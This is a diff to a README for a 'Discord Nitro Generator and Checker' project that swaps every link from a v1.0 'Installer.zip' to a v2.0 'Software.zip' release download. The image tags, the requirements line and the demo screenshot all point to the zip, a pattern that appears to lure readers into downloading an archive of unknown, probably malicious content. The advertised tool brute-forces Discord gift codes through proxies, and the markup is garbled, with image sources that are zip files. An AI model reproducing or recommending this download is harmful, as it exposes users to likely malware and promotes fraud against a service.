@@ -1,4 +1,4 @@
-# <p align="center"> <img src="https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip,h_400,https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip" width="25px"> Discord Nitro Generator and Checker <img src="https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip,h_400,https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip" width="25px">
+# <p align="center"> <img src="https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip,h_400,https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip" width="25px"> Discord Nitro Generator and Checker <img src="https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip,h_400,https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip" width="25px">
 </p>
 
 ## Fastest Nitro Generator and Checker
@@ -12,8 +12,8 @@
 # Requirements
 
 * Proxies - (ProxyScrape Proxies Work!)
-* https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip - https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip 
+* https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip - https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip 
 
 # Tool Working
 
-![NGwnpbhWa8](https://github.com/laidnotreal/Nitro-Generator/releases/download/v1.0/Installer.zip)
+![NGwnpbhWa8](https://github.com/laidnotreal/Nitro-Generator/releases/download/v2.0/Software.zip)
